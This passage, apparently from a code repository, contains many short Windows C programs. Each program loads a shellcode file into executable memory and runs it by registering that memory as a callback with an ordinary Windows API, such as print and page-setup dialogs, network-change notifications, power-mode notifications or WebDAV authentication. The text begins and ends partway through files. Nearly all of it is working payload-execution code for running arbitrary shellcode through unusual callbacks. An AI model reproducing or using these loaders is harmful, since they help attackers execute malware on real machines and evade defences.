// Usage: this.exe <shellcode file>
#pragma comment(lib, "Davclnt.lib")
#pragma comment(lib, "Netapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <davclnt.h>
#include <npapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	OPAQUE_HANDLE hOpaque = 0;
	HANDLE hCallbackReg = NULL;

	if (argc != 2)
	{
		printf("Usage: NPAddConnection3.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hOpaque = DavRegisterAuthCallback((PFNDAVAUTHCALLBACK)hAlloc, 0);

	NETRESOURCE sNR = { 0 };
	sNR.lpRemoteName = L"\\\\127.0.0.1\\C$";
	sNR.lpLocalName = NULL;
	sNR.dwType = RESOURCETYPE_ANY;

	NPAddConnection3(NULL, &sNR, NULL, NULL, CONNECT_INTERACTIVE | CONNECT_PROMPT);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hOpaque)
		DavUnregisterAuthCallback(hOpaque);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/NotifyIpInterfaceChange.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Iphlpapi.lib")

#include <stdio.h>
#include <windows.h>
#include <Iphlpapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NotifyIpInterfaceChange.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HANDLE hNotification = NULL;
	NotifyIpInterfaceChange(AF_UNSPEC, hAlloc, NULL, TRUE, &hNotification);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/NotifyNetworkConnectivityHintChange.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Iphlpapi.lib")

#include <stdio.h>
#include <windows.h>
#include <Iphlpapi.h>


BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NotifyNetworkConnectivityHintChange.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HANDLE hNotification = NULL;

	NotifyNetworkConnectivityHintChange((PNETWORK_CONNECTIVITY_HINT_CHANGE_CALLBACK)hAlloc, NULL, TRUE, &hNotification);
	
	Sleep(120 * 1000); //2 Min

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/NotifyRouteChange2.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Iphlpapi.lib")

#include <stdio.h>
#include <windows.h>
#include <Iphlpapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NotifyRouteChange2.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HANDLE hNotification = NULL;
	NotifyRouteChange2(AF_INET, hAlloc, NULL, TRUE, &hNotification);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/NotifyTeredoPortChange.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Iphlpapi.lib")

#include <stdio.h>
#include <windows.h>
#include <Iphlpapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NotifyTeredoPortChange.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HANDLE hNotification = NULL;
	NotifyTeredoPortChange(hAlloc, NULL, TRUE, &hNotification);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/NotifyUnicastIpAddressChange.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Iphlpapi.lib")

#include <stdio.h>
#include <windows.h>
#include <Iphlpapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NotifyUnicastIpAddressChange.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HANDLE hNotification = NULL;
	NotifyUnicastIpAddressChange(AF_INET, hAlloc, NULL, TRUE, &hNotification);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/OleUIBusy.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "OleDlg.lib")

#include <stdio.h>
#include <windows.h>
#include <oledlg.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: OleUIBusy.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	OLEUIBUSY sOleUIBusy = { 0 };
	sOleUIBusy.cbStruct = sizeof(OLEUIBUSY);
	sOleUIBusy.hWndOwner = GetForegroundWindow();
	sOleUIBusy.lpfnHook = (LPFNOLEUIHOOK)hAlloc;

	OleUIBusy(&sOleUIBusy);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/PageSetupDlg.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: PageSetupDlg.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	PAGESETUPDLG sPageSetupDlg = { 0 };
	sPageSetupDlg.lStructSize = sizeof(PAGESETUPDLG);
	sPageSetupDlg.Flags = PSD_ENABLEPAGESETUPHOOK;
	sPageSetupDlg.lpfnPageSetupHook = hAlloc;

	PageSetupDlg(&sPageSetupDlg);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/PdhBrowseCounters.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Pdh.lib")

#include <stdio.h>
#include <windows.h>
#include <pdh.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: PdhBrowseCounters.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	PDH_BROWSE_DLG_CONFIG sBDC = { 0 };
	sBDC.pCallBack = hAlloc;

	// This will show a dialog box. Simply select a counter and click "Add" to execute the payload
	PdhBrowseCounters(&sBDC);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/PerfStartProviderEx.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Advapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <perflib.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hProvider = NULL;

	if (argc != 2)
	{
		printf("Usage: PerfStartProviderEx.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	static const GUID ProviderGuid =
	{ 0x00000000, 0x0000, 0x0000, { 0x00, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

	PERF_PROVIDER_CONTEXT sPPC = { 0 };
	sPPC.MemAllocRoutine = (PERF_MEM_ALLOC)hAlloc;
	sPPC.ContextSize = sizeof(PERF_PROVIDER_CONTEXT);

	PerfStartProviderEx(&ProviderGuid, &sPPC, &hProvider);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hProvider)
		PerfStopProvider(hProvider);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/PowerRegisterForEffectivePowerModeNotifications.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Powrprof.lib")

#include <stdio.h>
#include <windows.h>
#include <powersetting.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hRegister = NULL;

	if (argc != 2)
	{
		printf("Usage: PowerRegisterForEffectivePowerModeNotifications.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	PowerRegisterForEffectivePowerModeNotifications(EFFECTIVE_POWER_MODE_V2, hAlloc, NULL, &hRegister);

	Sleep(INFINITE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hRegister)
		PowerUnregisterFromEffectivePowerModeNotifications(hRegister);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/PrintDlg.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: PrintDlg.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	PRINTDLG sPrintDlg = { 0 };
	sPrintDlg.lStructSize = sizeof(PRINTDLG);
	sPrintDlg.Flags = PD_ENABLEPRINTHOOK;
	sPrintDlg.lpfnPrintHook = (LPPRINTHOOKPROC)hAlloc;

	PrintDlg(&sPrintDlg);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/RegisterWaitChainCOMCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Advapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <wct.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: RegisterWaitChainCOMCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	RegisterWaitChainCOMCallback((PCOGETCALLSTATE)hAlloc, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/RegisterWaitForSingleObject.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	HANDLE hNewWaitObj = NULL;

	if (argc != 2)
	{
		printf("Usage: RegisterWaitForSingleObject.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hFile = CreateFile(L"C:\\Windows\\explorer.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
	 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	RegisterWaitForSingleObject(&hNewWaitObj, hFile, (WAITORTIMERCALLBACK)hAlloc, NULL, 0, WT_EXECUTEONLYONCE);

	Sleep(1000);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hFile)
		CloseHandle(hFile);

	if (hNewWaitObj)
		UnregisterWait(hNewWaitObj);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/ReplaceText.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: ReplaceText.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	FINDREPLACE sFindReplace = { 0 };
	sFindReplace.lStructSize = sizeof(FINDREPLACE);
	sFindReplace.hwndOwner = GetForegroundWindow();
	sFindReplace.Flags = FR_ENABLEHOOK;
	sFindReplace.lpstrFindWhat = L"h7arW";
	sFindReplace.lpstrReplaceWith = L"Wra7h";
	sFindReplace.wFindWhatLen = 1;
	sFindReplace.wReplaceWithLen = 1;
	sFindReplace.lpfnHook = (LPFRHOOKPROC)hAlloc;

	ReplaceText(&sFindReplace);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/RoInspectCapturedStackBackTrace.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "RuntimeObject.lib")

#include <stdio.h>
#include <windows.h>
#include <roerrorapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: RoInspectCapturedStackBackTrace.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	UINT32 cFrame = 0;
	UINT_PTR pTraceAddr = NULL;
	RoInspectCapturedStackBackTrace(NULL, NULL, hAlloc, NULL, &cFrame, &pTraceAddr);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/RoInspectThreadErrorInfo.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "RuntimeObject.lib")

#include <stdio.h>
#include <windows.h>
#include <roerrorapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: RoInspectThreadErrorInfo.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	UINT_PTR pInfoAddr = NULL;
	RoInspectThreadErrorInfo(NULL, NULL, hAlloc, NULL, NULL, &pInfoAddr);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/SHBrowseForFolder.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>
#include <shlobj_core.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: SHBrowseForFolder.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	BROWSEINFO sBI = { 0 };
	sBI.hwndOwner = NULL;
